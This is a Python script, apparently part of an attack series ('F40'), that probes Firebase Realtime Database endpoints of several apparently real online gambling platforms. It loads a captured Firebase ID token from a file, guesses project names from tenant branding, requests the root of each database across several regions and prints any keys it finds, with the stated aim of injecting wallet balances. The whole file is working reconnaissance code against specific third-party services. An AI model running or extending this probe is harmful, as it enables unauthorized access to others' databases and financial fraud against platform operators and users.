#!/usr/bin/env python3 -I
"""F40 — Firebase RTDB wallet balance injection probe."""
import requests, pathlib, json, ssl

# Firebase ID token for we88c
FB_TOKEN = pathlib.Path(".fb_we88c_id_token.txt").read_text().strip()

# GCS bucket is gs://we88z/ → Firebase project likely "we88z"
# Try common project names derived from tenant branding
PROJECTS = [
    "we88z",
    "we88c",
    "royalflush888",
    "i-gamingplatform",
    "z-seamless",
    "luxino",
    "wbslots",
]

print(f"[token] len={len(FB_TOKEN)} prefix={FB_TOKEN[:20]}...")

for proj in PROJECTS:
    base = f"https://{proj}-default-rtdb.firebaseio.com"
    # Try root .json
    try:
        r = requests.get(f"{base}/.json",
            params={"auth": FB_TOKEN},
            timeout=8)
        status = r.status_code
        body = r.text[:200]
        print(f"\n[{proj}] {base}")
        print(f"  GET /.json → {status} {body!r}")
        if status == 200 and r.text != "null":
            # Dump structure
            try:
                data = r.json()
                if isinstance(data, dict):
                    print(f"  KEYS: {list(data.keys())[:20]}")
            except Exception:
                pass
    except Exception as e:
        print(f"\n[{proj}] ERR: {e!s:.80}")

# Also try with alternate RTDB URLs
print("\n\n--- alternate regions ---")
alt_projects = ["we88z", "royalflush888", "wbslots"]
regions = ["asia-southeast1", "us-central1", "europe-west1"]
for proj in alt_projects:
    for region in regions:
        base = f"https://{proj}-default-rtdb.{region}.firebasedatabase.app"
        try:
            r = requests.get(f"{base}/.json",
                params={"auth": FB_TOKEN},
                timeout=5)
            if r.status_code != 400:  # 400 = project doesn't exist
                print(f"[{proj}/{region}] → {r.status_code} {r.text[:100]!r}")
        except Exception as e:
            if "Failed to" not in str(e):
                print(f"[{proj}/{region}] ERR: {e!s:.60}")
